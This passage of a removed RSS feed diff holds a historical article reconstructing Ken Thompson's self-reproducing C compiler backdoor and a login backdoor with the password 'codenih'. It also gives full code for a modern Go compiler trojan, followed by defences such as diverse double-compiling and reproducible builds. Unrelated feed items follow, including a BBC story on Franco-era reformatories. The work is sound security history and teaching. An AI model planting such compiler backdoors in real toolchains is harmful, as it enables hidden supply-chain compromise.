-so the lines that follow are for <code>ed</code>.
-</p></td><td><pre>ed x.c
-</pre>
-</td></tr><tr>
-<td>
-<p>Delete all tabs from every line.
-</p></td><td><pre>1,$s/    //g
-</pre>
-</td></tr><tr>
-<td>
-<p>Write the modified file to <code>nih.c</code> and quit.<br>
-The shell will continue reading the input script.
-</p></td><td><pre>w nih.c
-q
-</pre>
-</td></tr><tr>
-<td>
-<p>Octal dump bytes of <code>nih.c</code> into <code>x</code>.<br>
-The output looks like:
-</p>
-<p><code>% echo az | od -b<br>
-0000000 141 172 012 000<br>
-0000003 <br>
-%<br>
-</code></p>
-<p>Note the trailing <code>000</code> for an odd-sized input.<br>
-
-
-</p></td><td><pre>od -b nih.c &gt;x
-</pre>
-</td></tr><tr>
-<td>
-<p>Back into <code>ed</code>, this time editing <code>x</code>.
-</p></td><td><pre>ed x
-</pre>
-</td></tr><tr>
-<td>
-<p>Remove the leading file offsets, adding a <code>0</code><br>
-at the start of the first byte value.
-</p></td><td><pre>1,$s/^....... 0*/0/
-</pre>
-</td></tr><tr>
-<td>
-<p>Replace each space before a byte value<br>
-with a newline and a leading <code>0</code>.<br>
-Now all the octal values are C octal constants.
-</p></td><td><pre>1,$s/ 0*/\
-0/g
-</pre>
-</td></tr><tr>
-<td>
-<p>Delete 0 values caused by odd-length padding<br>
-or by the final offset-only line.
-</p></td><td><pre>g/^0$/d
-</pre>
-</td></tr><tr>
-<td>
-<p>Add trailing commas to each line.
-</p></td><td><pre>1,$s/$/,/
-</pre>
-</td></tr><tr>
-<td>
-<p>Write <code>x</code> and switch to <code>nih.c</code>.
-</p></td><td><pre>w x
-e nih.c
-</pre>
-</td></tr><tr>
-<td>
-<p>Move to and delete the magic <code>%0</code> line.
-</p></td><td><pre>/%/d
-</pre>
-</td></tr><tr>
-<td>
-<p>Read <code>x</code> (the octal values) into the file there.
-</p></td><td><pre>.-1r x
-</pre>
-</td></tr><tr>
-<td>
-<p>Add a trailing <code>0</code> to end the array.
-</p></td><td><pre>.a
-0
-.
-</pre>
-</td></tr><tr>
-<td>
-<p>Write <code>nih.c</code> and quit. All done!
-</p></td><td><pre>w nih.c
-q
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s run <code>rc</code>.<br>
-The numbers are <code>ed</code> printing file sizes<br>
-each time it reads or writes a file.
-</p></td><td><pre>% <b>sh rc</b>
-1314
-1163
-5249
-6414
-1163
-6414
-7576
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s check the output, <code>nih.c</code>.<br>
-The tabs are gone and the octal bytes are there!
-</p></td><td><pre>% <b>cat nih.c</b>
-nihflg;
-codenih()
-{
-char *p,*s;
-int i;
-if(pflag)
-return;
-<span>...</span>
-char nihstr[]
-{
-0156,
-0151,
-0150,
-0146,
-<span>...</span>
-0175,
-012,
-0175,
-012,
-0
-};
-repronih()
-{
-int i,n,c;
-<span>...</span>
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s make an evil compiler,<br>
-applying the <code>codenih</code> changes by hand.
-</p></td><td><pre>% <b>cp /usr/source/s1/cc.c cc.c</b>
-% <b>cp cc.c ccevil.c</b>
-% <b>ed ccevil.c</b>
-12902
-</pre>
-</td></tr><tr>
-<td>
-<p>Add <code>codenih</code> after <code>getline</code>.
-</p></td><td><pre><b>/getline/</b>
-    while(getline()) {
-<b>s/$/ codenih();/</b>
-<b>.</b>
-    while(getline()) { codenih();
-</pre>
-</td></tr><tr>
-<td>
-<p>Add <code>repronih</code> after <code>fflush</code>.
-</p></td><td><pre><b>/fflush/</b>
-    fflush(obuf);
-<b>s/$/ repronih();/</b>
-<b>.</b>
-    fflush(obuf); repronih();
-</pre>
-</td></tr><tr>
-<td>
-<p>Add <code>nih.c</code> at the end of the file.
-</p></td><td><pre><b>$r nih.c</b>
-7576
-<b>w</b>
-20501
-<b>q</b>
-</pre>
-</td></tr><tr>
-<td>
-<p>Build the evil and good code with the good <code>cc</code>.
-</p></td><td><pre>% <b>cc ccevil.c; mv a.out ccevil</b>
-% <b>cc cc.c; mv a.out ccgood</b>
-% <b>ls -l ccevil ccgood</b>
--rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
--rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
-</pre>
-</td></tr><tr>
-<td>
-<p>The good compiler still compiles<br>
-the original <code>cc.c</code> correctly.
-</p></td><td><pre>% <b>ccgood cc.c</b>
-% <b>ls -l a.out</b>
--rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
-</pre>
-</td></tr><tr>
-<td>
-<p>The evil compiler compiles<br>
-the original <code>cc.c</code> with the backdoor:<br>
-12,918 bytes instead of 10,724.
-</p></td><td><pre>% <b>ccevil cc.c</b>
-% <b>ls -l a.out</b>
--rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
-</pre>
-</td></tr><tr>
-<td>
-<p>The evil compilers don’t match exactly,<br>
-but only because the binary contains the name of<br>
-the source file (<code>ccevil.c</code> versus <code>cc.c</code>).<br>
-One more round will converge them.
-</p></td><td><pre>% <b>cmp a.out ccevil</b>
-a.out ccevil differ: char 9428, line 377
-% <b>cmp -l a.out ccevil</b>
- 9428  56 145
- 9429 157 166
- 9430   0 151
- 9431   0 154
- 9432   0  56
- 9433   0 157
-% <b>cp a.out ccevil</b>
-% <b>ccevil cc.c</b>
-% <b>cmp a.out ccevil</b>
-%
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s install the evil compiler.
-</p></td><td><pre>% <b>su</b>
-password: <b>root</b>
-# <b>cp ccevil /bin/cc</b>
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s rebuild everything from clean sources.<br>
-The compiler still contains the backdoor.<br>
-</p></td><td><pre># <b>cc /usr/source/s1/cc.c</b>
-# <b>cp a.out /bin/cc</b>
-# <b>ls -l /bin/cc</b>
--rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
-# <b>cc /usr/source/s1/login.c</b>
-# <b>cp a.out /bin/login</b>
-# ^D
-</pre>
-</td></tr><tr>
-<td>
-<p>Now we can log in as root<br>
-with the magic password.
-</p></td><td><pre>% ^D
-
-login: <b>root</b>
-Password: <b>codenih</b>
-
-# <b>who</b>
-root    tty8 Aug 14 22:32
-#
-</pre>
-</td></tr></tbody></table>
-
-<a href="#timeline"><h2 id="timeline">Timeline</h2></a>
-
-<p>
-This code can be dated to some time in the one-year period
-from June 1974 to June 1975, probably early 1975.
-</p>
-
-<p>
-The code does not work in V5 Unix, released in June 1974.
-At the time, the C preprocessor code only processed
-input files that began with the first character ‘#’.
-The backdoor is in the preprocessor,
-and the V5 <code>cc.c</code> did not start with ‘#’
-and so wouldn’t have been able to modify itself.
-The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
-that Ken credits for inspiring the backdoor is also dated June 1974.
-So the code post-dates June 1974.
-</p>
-
-<p>
-Although it wasn’t used in V6,
-the archive records the modification time (mtime)
-of each file it contains.
-We can read the mtime directly from the archive using a modern Unix system:
-</p>
-
-<pre>% hexdump -C nih.a
-00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|
-00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |".nihflg;.codeni|
-...
-00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 <b>46 0a eb 5e</b>  |}.}.rc......F..^|
-00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
-% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))
-Thu Jun 19 00:49:47 EDT 1975
-% date -r 0x0a465eeb
-Thu Jun 19 00:26:19 EDT 1975
-%
-</pre>
-
-<p>
-So the code was done by June 1975.
-</p>
-
-<a href="#deployment"><h2 id="deployment">Controlled Deployment</h2></a>
-
-<p>
-In addition to the quote above from the Q&amp;A, the story of the deployment
-of the backdoor has been told publicly many times
-(<a href="https://groups.google.com/g/net.lang.c/c/kYhrMYcOd0Y/m/u_D2lWAUCQoJ">1</a>
-<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">2</a>
-<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">3</a>
-<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">4</a>
-<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">5</a>
-<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">6</a>
-<a href="https://www.tuhs.org/pipermail/tuhs/2021-November/024657.html">7</a>),
-sometimes with conflicting minor details.
-Based on these many tellings, it seems clear
-that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>
-(not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a> as sometimes reported)
-that was induced to copy the backdoored C compiler,
-that eventually the login program on that system got backdoored too,
-that PWB discovered something was amiss
-because the compiler got bigger each time it compiled itself,
-and that eventually they broke the reproduction and
-ended up with a clean compiler.
-
-</p><p>
-John Mashey tells the story of the PWB group obtaining and discovering the backdoor
-and then him overhearing Ken and Robert H. Morris discussing it
-(<a href="https://groups.google.com/g/net.lang.c/c/W4Oj3EVAvNc/m/XPAtApNycLUJ">1</a>
-<a href="https://mstdn.social/@JohnMashey/109991275086879095">2</a> <a href="https://archive.computerhistory.org/resources/access/text/2018/10/102738835-05-01-acc.pdf">3</a> (pp. 29-30)
-<a href="https://www.youtube.com/watch?v=Vd7aH2RrcTc&amp;t=4776s">4</a>).
-In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book <i>Shockwave Rider</i>,
-which was published in early 1975.
-(It appeared in the “New Books” list in the <i>New York Times</i> on March 5, 1975 (p. 37).)
-
-</p><p>
-All tellings of this story agree that the compiler didn’t make it any farther than PWB.
-Eric S. Raymond’s Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
-with rumors to the contrary. After describing Ken’s work, it says:</p>
-
-<blockquote>
-Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
-</blockquote>
-
-<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
-The technical details don’t line up either: as we just saw,
-the login change only accepts “codenih”
-as a password for an account that already exists.
-So the Jargon File story is false.
-</p>
-
-<p>Even so, it turns out that the backdoor did leak out in one specific sense.
-In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
-Some bits were posted then, and others were held back.
-In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
-and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
-the full set.
-One of the tapes contains various files from Ken, which Dennis had described as
-“A bunch of interesting old ken stuff (eg a version of
-the units program from the days when the dollar fetched
-302.7 yen).”
-Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
-When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
-it contained the exact same files, but dated January 28, 1998,
-and in the modern textual archive format rather than the binary V6 format.
-The V6 simulator contains the <code>nih.a</code> from Dennis’s tapes.
-</p>
-
-<a href="#buggy"><h2 id="buggy">A Buggy Version</h2></a>
-
-<p>
-The backdoor was noticed because the compiler got one byte larger
-each time it compiled itself.
-About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
-“just a bug.”
-We can see which string constant it must have been (<code>nihstr</code>),
-but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
-An interesting game would be to try to reconstruct the most plausible diff that
-reintroduces the bug.
-</p>
-
-<p>
-It seems to me that to add an extra NUL byte each time,
-you need to use <code>sizeof</code> to decide
-when to stop the iteration, instead of stopping at the first NUL.
-My best attempt is:
-</p>
-
-<pre> repronih()
- {
-     int i,n,c;
-     if(nihflg!=3)
-         return;
-<span>-    n=0;</span>
-<span>-    i=0;</span>
-<span>-    for(;;)</span>
-<span>+    for(n=0; n&lt;5; n++)</span>
-<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
-     switch(c=nihstr[i++]){
-     case 045:
-         n++;
-         if(n==1)
-             i=0;
-         if(n!=2)
-             continue;
-     default:
-         if(n==1||n==2){
-             putc('0',obuf);
-             if(c&gt;=0100)
-                 putc((c&gt;&gt;6)+'0',obuf);
-             if(c&gt;=010)
-                 putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
-             putc((c&amp;7)+'0',obuf);
-             putc(',',obuf);
-             putc('\n',obuf);
-             continue;
-         }
-         if(n!=3)
-             putc(c,obuf);
-         continue;
-<span>-    case 0:</span>
-<span>-        n++;</span>
-<span>-        i=0;</span>
-<span>-        if(n==5){</span>
-<span>-            fflush(obuf);</span>
-<span>-            return;</span>
-<span>-        }</span>
-     }
-<span>+    fflush(obuf);</span>
- }
-</pre>
-
-<p>
-I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
-And if the code had been written this way, it would have been easier to
-remove the 0 being added in the <code>rc</code> script
-than to complicate the code. But maybe.
-</p>
-
-<p>
-Also note that the compiler cannot get one byte larger
-each time it compiles itself, because V6 Unix binaries
-were rounded up to a 2-byte boundary.
-While <code>nihstr</code> gets one byte larger each time,
-the compiler binary gets two bytes larger every second time.
-</p>
-
-<a href="#modern"><h2 id="modern">A Modern Version</h2></a>
-
-<p>
-Even seeing the code run in the V6 simulator,
-it can be easy to mentally dismiss this kind of backdoor as an old problem.
-Here is a more modern variant.
-</p>
-
-<p>
-The Go compiler reads input files using a routine called <code>Parse</code>
-in the package <code>cmd/compile/internal/syntax</code>.
-The input is abstracted as an <code>io.Reader</code>,
-so if we want to replace the input, we need to interpose a new reader.
-We can do that easily enough:
-</p>
-
-<pre>     var p parser
-<span>+    src = &amp;evilReader{src: src}</span>
-     p.init(base, src, errh, pragh, mode)
-</pre>
-
-<p>
-Then we need to implement <code>evilReader</code>, which is not too difficult either:
-</p>
-
-<pre>type evilReader struct {
-    src  io.Reader
-    data []byte
-    err  error
-}
-
-func (r *evilReader) Read(b []byte) (int, error) {
-    if r.data == nil {
-        data, err := io.ReadAll(r.src)
-        s := string(data)
-        if evilContains(s, "package main") &amp;&amp; evilContains(s, "\"hello, world\\n\"") {
-            s = evilReplace(s,
-                "\"hello, world\\n\"",
-                "\"backdoored!\\n\"")
-        }
-        if evilContains(s, "package syntax") &amp;&amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
-            s = evilReplace(s,
-                "p.init(base, src, errh, pragh, mode)",
-                "src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
-            s += evilSource()
-        }
-        r.data = []byte(s)
-        r.err = err
-    }
-    if r.err != nil {
-        return 0, r.err
-    }
-    n := copy(b, r.data)
-    r.data = r.data[n:]
-    if n == 0 {
-        return 0, io.EOF
-    }
-    return n, nil
-}
-</pre>
-
-<p>
-The first replacement rewrites a “hello, world” program to a “backdoored!” program.
-The second replacement reproduces the change inside the compiler.
-To make this work inside the compiler, we need <code>evilSource</code> to return
-the source code of the <code>evilReader</code>,
-which we know how to do.
-The <code>evilContains</code> and <code>evilReplace</code>
-functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
-since the code in question does not import <code>strings</code>,
-and the build system may not have provided it for the compiler to import.
-</p>
-
-<p>
-Completing the code:
-</p>
-
-<pre>func evilIndex(s, t string) int {
-    for i := 0; i &lt; len(s)-len(t); i++ {
-        if s[i:i+len(t)] == t {
-            return i
-        }
-    }
-    return -1
-}
-
-func evilContains(s, t string) bool {
-    return evilIndex(s, t) &gt;= 0
-}
-
-func evilReplace(s, old, new string) string {
-    i := evilIndex(s, old)
-    if i &lt; 0 {
-        return s
-    }
-    return s[:i] + new + s[i+len(old):]
-}
-
-func evilSource() string {
-    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
-}
-
-var evilText = <span>`
-type evilReader struct {
-    src  io.Reader
-    data []byte
-    err  error
-}
-
-...
-
-func evilSource() string {
-    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
-}
-`</span>
-</pre>
-
-<p>
-Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
-</p>
-
-<pre>% go install cmd/compile
-% git stash
-Saved working directory ...
-% git diff  # source is clean!
-% go install cmd/compile
-% cat &gt;x.go
-package main
-
-func main() {
-    print("hello, world\n")
-}
-^D
-% go run x.go
-backdoored!
-%
-</pre>
-
-
-<a href="#reflections"></a>
-
-<p>With all that experience behind us, a few observations from the vantage point of 2023.
-
-</p><p><a href="#short"><b id="short">It’s short!</b></a>
-When Ken sent me <code>nih.a</code> and I got it running,
-my immediate reaction was disbelief at the size of the change: 99 lines of code,
-plus a 20-line shell script.
-If you already know how to make a program print itself,
-the biggest surprise is that there are no surprises!
-
-</p><p>
-It’s one thing to say “I know how to do it in theory”
-and quite another to see how small and straightforward the backdoor is in practice.
-In particular, hooking into source code reading makes it trivial.
-Somehow, I’d always imagined some more complex pattern matching
-on an internal representation in the guts of the compiler,
-not a textual substitution.
-Seeing it run, and seeing how tiny it is,
-really drives home how easy it would be to make a change like this
-and how important it is to build from trusted sources
-using trusted tools.
-
-</p><p>
-I don’t say any of this to put down Ken’s doing it in the first place:
-it seems easy <i>because</i> he did it and explained it to us.
-But it’s still very little code for an extremely serious outcome.
-
-</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
-In the early days of working on and talking about
-<a href="https://go.dev/">Go</a>,
-people often asked us why the Go compiler
-was written in C, not Go.
-The real reason is that we wanted to spend our time making
-Go a good language for distributed systems
-and not on making it a good language for writing compilers,
-but we would also jokingly respond that
-people wouldn’t trust a self-compiling compiler from Ken.
-After all, he had ended his Turing lecture by saying:
-</p>
-
-<blockquote>
-The moral is obvious. You can’t trust code that you did not totally create yourself.
-(Especially code from companies that employ people like me.)
-No amount of source-level verification or scrutiny will protect you from using untrusted code.
-</blockquote>
-
-<p>
-Today, however, the Go compiler does compile itelf,
-and that prompts the important question of why it should
-be trusted, especially when a backdoor is so easy to add.
-The answer is that we have never required that the
-compiler rebuild itself.
-Instead the compiler always builds from an earlier
-released version of the compiler.
-This way, anyone can reproduce the current binaries
-by starting with Go 1.4 (written in C), using
-Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
-and so on.
-There is no point in the cycle where the compiler
-is required to compile itself,
-so there is no place for a binary-only backdoor to hide.
-In fact, we recently published programs to make it easy to
-rebuild and verify the Go toolchains,
-and we demonstrated how to use them to verify
-one version of Ubuntu’s Go toolchain without using Ubuntu at all.
-See “<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>” for details.
-</p>
-
-<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
-An important advancement since 1983 is that we know a defense against this backdoor,
-which is to build the compiler source two different ways.
-
-</p><p>
-<img name="ddc" width="482" height="245" src="https://research.swtch.com/ddc.png" srcset="https://research.swtch.com/ddc.png 1x, https://research.swtch.com/ddc@2x.png 2x">
-
-</p><p>
-Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
-First, we compile that source code with a trusted second compiler, compiler 2,
-producing compiler 2.1.
-If everything is on the up-and-up, compiler 1 and compiler 2.1
-should be semantically equivalent,
-even though they will be very different at the binary level,
-since they were generated by different compilers.
-Also, compiler 2.1 cannot contain
-a binary-only backdoor inserted by compiler 1,
-since it wasn’t compiled with that compiler.
-Now we compile the source code again with both compiler 1 and compiler 2.1.
-If they really are semantically equivalent,
-then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
-If that’s true, then we’ve established that compiler 1 does not insert any
-backdoors when compiling itself.
-</p>
-
-<p>
-The great thing about this process is that we don’t even need to know which of compiler 1 and 2
-might be backdoored.
-If compilers 1.1 and 2.1.1 are identical,
-then they’re either both clean or both backdoored the same way.
-If they are independent implementations
-from independent sources,
-the chance of both being backdoored the same way is far less likely
-than the chance of compiler 1 being backdoored.
-We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
-and vice versa.
-</p>
-
-<p>
-Another great thing about this process is that
-compiler 2 can be a custom, small translator
-that’s incredibly slow and not fully general
-but easier to verify and trust.
-All that matters is that it can run well enough
-to produce compiler 2.1,
-and that the resulting code runs well enough
-to produce compiler 2.1.1.
-At that point, we can switch back to the fast,
-fully general compiler 1.
-</p>
-
-<p>
-This approach is called “diverse double-compiling,”
-and the definitive reference is
-<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler’s PhD thesis and related links</a>.
-</p>
-
-<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
-Diverse double-compiling and any other verifying of binaries
-by rebuilding source code depends on builds being reproducible.
-That is, the same inputs should produce the same outputs.
-Computers being deterministic, you’d think this would be trivial,
-but in modern systems it is not.
-We saw a tiny example above,
-where compiling the code as <code>ccevil.c</code>
-produced a different binary than compiling
-the code as <code>cc.c</code>
-because the compiler embedded the file name
-in the executable.
-Other common unwanted build inputs include
-the current time, the current directory,
-the current user name, and many others,
-making a reproducible build far more difficult than it should be.
-The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
-project collects resources to help people achieve this goal.
-</p>
-
-<p><a href="#modern"><b id="modern">Modern Security</b></a>.
-In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
-It suggested requiring source code as a way to allow inspection of the system on delivery,
-and it raised this kind of backdoor as a potential barrier to that inspection.
-Half a century later, we all run binaries with no available source code at all.
-Even when source is available, as in open source operating systems like Linux,
-approximately no one checks that the distributed binaries match the source code.
-The programming environments for languages like Go, NPM, and Rust make it
-trivial to download and run source code published by <a href="https://research.swtch.com/deps">strangers on the internet</a>,
-and again almost no one is checking the code, until there is a problem.
-No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.
-
-</p><p>
-On the other hand, given all our reckless behavior,
-there are far fewer problems than you would expect.
-Quite the opposite:
-we trust computers with nearly every aspect of our lives,
-and for the most part nothing bad happens.
-Something about our security posture must be better than it seems.
-Even so, it might be nicer to live in a world where
-the only possible attacks required the sophistication of approaches like Ken’s
-(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
-</p>
-
-<p>
-We still have work to do.
-</p>
-
-      </div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Iran begins cloud seeding operations as drought bites (132 pts)]]></title>
-            <link>https://www.arabnews.com/node/2622812/middle-east</link>
-            <guid>45945188</guid>
-            <pubDate>Sun, 16 Nov 2025 13:57:03 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://www.arabnews.com/node/2622812/middle-east">https://www.arabnews.com/node/2622812/middle-east</a>, See on <a href="https://news.ycombinator.com/item?id=45945188">Hacker News</a></p>
-Couldn't get https://www.arabnews.com/node/2622812/middle-east: Error: Request failed with status code 403]]></description>
-        </item>
-        <item>
-            <title><![CDATA[My mum was a 17-year-old free spirit so she was locked up and put in a coma (152 pts)]]></title>
-            <link>https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</link>
-            <guid>45945101</guid>
-            <pubDate>Sun, 16 Nov 2025 13:44:20 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://www.bbc.co.uk/news/articles/cr43vx0rrwvo">https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</a>, See on <a href="https://news.ycombinator.com/item?id=45945101">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div data-component="text-block"><p><b>Marina Freixa always knew there was something dark and unspoken about her family.</b></p><p>Her mother had grown up under Spain's decades-long dictatorship, which ended in 1975, but the details of her childhood were hazy.</p><p>Then everything changed one Christmas a decade ago - when Marina was about 20.</p><p>That winter's evening around the table, with a cloud of cigarette smoke suspended in the air and wine glasses drained, Marina's mother, Mariona Roca Tort, began to speak.</p></div><div data-component="text-block"><p>"My parents reported me to the authorities," Mariona told them. "They put me in a reformatory when I was 17."</p><p>Reformatories were institutions where girls and young women who refused to conform to the Franco regime's Catholic values were detained - single mothers, girls with boyfriends, lesbians. Girls who'd been sexually assaulted were incarcerated, assuming the blame for their own abuse. Orphans and abandoned girls might also find themselves living behind convent walls.</p><p>Marina and her cousins were stunned.</p><p>They couldn't comprehend that their grandparents had arranged to have their own daughter locked up.</p><p>Mariona's memory of telling this story to the youngsters in her family is blurred, she believes as a result of the psychiatric "treatment" she was forced to undergo at the reformatory. But Marina didn't forget the revelations, and years later, she would make a documentary telling her mother's story.</p></div><div data-component="text-block"><p><i><b>Warning: This article contains content that some readers might find distressing</b></i></p><p>Mariona, the oldest of nine siblings, describes her parents as right-wing and ultra-Catholic. They were so conservative they wouldn't even let Mariona wear trousers.</p><p>But in 1968, when she turned 16, a new world unfolded.</p><p>Mariona was tutoring children during the day, and preparing for university at evening classes. There, she says, she met people she'd never encountered before - trade unionists, left-wingers and anti-Franco activists. It was the year of global protests against authoritarianism and the Vietnam War, with mass demands for civil rights. The spirit of revolt was infectious.</p><p>Franco had been in power for three decades. Political parties were banned, censorship was universal and young people wanted change. Soon, Mariona joined her new friends on "raids": a few of them would block off a street, throw Molotov cocktails, hand out leaflets, and when the police turned up, scatter in every direction.</p><p>On May Day 1969, one of Mariona's friends was arrested at a demonstration in Barcelona. There was a risk the detainee would give names to the police - so Mariona couldn't go home, in case they came looking for her. That night she stayed in the flat of a fellow activist.</p><p>Returning home the next day, Mariona was in deep trouble. Her parents were furious, and began to exert far more control over her life.</p><p>"For them, it was a scandal, a stain on the family," she says. "After that, they wouldn't let me out."</p><p>By the end of that summer, Mariona had resolved to leave home, and travelled to the holiday island of Menorca with some college friends, leaving her parents a note.</p><p>They immediately reported her as an underage runaway to the authorities, and the moment Mariona was about to board a boat back to Barcelona, she was arrested.</p></div><div data-component="text-block"><p>At the port in Barcelona her parents met her.</p><p>They didn't take her home. Instead, they took her to a convent. Mariona wasn't given any explanation - she only remembers her parents' rage.</p><p>Days later she flew to Madrid with her father. There, she was driven directly to another convent, part of the Patronato system, under Spain's Ministry of Justice.</p><p>She and the other interned women were categorised and segregated.</p><p>Mariona says she ended up on the first floor - reserved for "the rebellious ones - the ones they considered fallen women".</p><p>The Patronato had the power to detain any non-conforming woman under 25. They weren't criminals - they were females deemed in need of "re-education".  But Mariona never learned the stories of the others she was confined with.</p><p>"They didn't let us talk.  It's quite incredible," she says. "And you wonder, how did they manage it?"</p><p>The internees were only allowed to exchange simple greetings with each other - a form of control, and a way of preventing "bad" girls influencing others.</p><p>"What you couldn't do was really get to know another girl,"  says Mariona. "Because then they'd separate you - send one of you to a different dormitory, or even to another institution."</p><p>She thinks there were around 100 internees at the convent. They slept 20 to a room, with a nun at one end, and the door locked. The daily routine was gruelling - prayers, Mass, cleaning the convent, and then hours in a workshop making clothes for local retailers. While the girls sewed, a nun read aloud so that no-one talked.</p><p>"There was indoctrination," recalls Mariona. "So that you should understand you'd behaved very badly. Then once you realised this, you'd ask for forgiveness and confess."</p><p>Mariona never confessed.</p></div><div data-component="text-block"><p>After around four months, she was allowed to return home to Barcelona for Christmas, but wasn't permitted to go out alone. Somehow - and Mariona doesn't remember how - she managed to escape, but her escape was short lived. Within hours she was bundled into a car with her father and an uncle, and driven back to Madrid.</p><p>"We arrived back at the convent at dusk," she recalls. "I refused to go in. They pulled me up the stairs and gave me a sedative to get me inside."</p><p>Inside the convent, the other young women were warned against talking to her - the rebel girl who had the nerve to try to run away. She grew intensely lonely, and eventually began refusing food.</p><p>Dramatic weight loss resulted in her admission to a psychiatric clinic. There, she says she was given two sessions of electric shock treatment, followed by what was called "insulin coma therapy".</p><p>Mariona says she was injected with insulin to induce deep hypoglycemia - a coma-like state caused by low blood sugar. It was believed this could reduce psychotic or schizophrenic symptoms, and somehow "re-set" a patient's brain. </p><p>It was a "therapy" that was being discontinued in many countries for one simple reason: it could be lethal.</p><p>Mariona received an insulin injection in the mornings. Later she'd be brought out of the coma and made to eat. Mentally, she began to shut down.</p><p>"Everyday, I was more dazed. I started saying things like, 'I hurt my parents,'" she says.</p><p>"I entered this process of submission and acceptance."</p><p>Mariona believes the forced, intravenous "treatment" with insulin irreparably damaged her memory. Suspecting it was causing her to forget things, she began keeping a diary. More than five decades later, this faded, paper document from 1971 would inform Marina's documentary about her mother's experience.</p><p>Doctors believed the "treatment" would help Mariona gain weight - but that wasn't happening. </p><p>"One day, the psychiatrist decided it was better to try tying me to the bed until I ate."</p><p>Mariona's despair became so unbearable, she says she thought about taking her own life. Then the psychiatrist gave her a target weight of 40kg (6st 4lb). If she achieved that, they promised she'd be released from the clinic.</p></div><div data-component="text-block"><p>Mariona succeeded. In 1972, once she'd grown a little stronger, she returned to Barcelona.</p><p>Now aged 20, she vowed to never live with her parents again.</p><p>These were the final years of Franco's dictatorship before his death in 1975. Mariona moved from job to job, eventually forging a career as a TV director. She had children of her own, but her relationship with her parents remained cool.</p><p>At some point, Mariona asked her mother why she'd been sent to the Patronato. Her mother only said: "We made a mistake."</p><p>Mariona's father is in his 90s now. </p><p>"We suffered a lot too," he told her when she asked him about the family decision to have her locked up in Madrid.</p><p>For Marina, learning more about her mother's story has complicated her relationship with her grandfather.</p><p>"I can't force myself to love someone who's caused so much pain - who treated my mother very badly."</p><p>The short documentary Marina produced about her mother's experience of the Patronato is called Els Buits - Catalan for "the spaces" - a reference to the blanks in Mariona's memory. The film has won prizes in Spain, and was nominated for a prestigious Goya Award.</p></div><div data-component="text-block"><p>Fifty years after the death of Franco, the film has contributed to a groundswell of calls for the interned women to be formally recognised under the law as victims of Spain's dictatorship. Spain's Minister for Democratic Memory, Ángel Víctor Torres, said his government was open to looking at the case of the Patronato survivors.</p><p>Meanwhile, Marina and Mariona are on tour with the film, taking it to community screenings.</p><p>"Women come and tell their stories – it's like a door opened to something unknown, and that's very 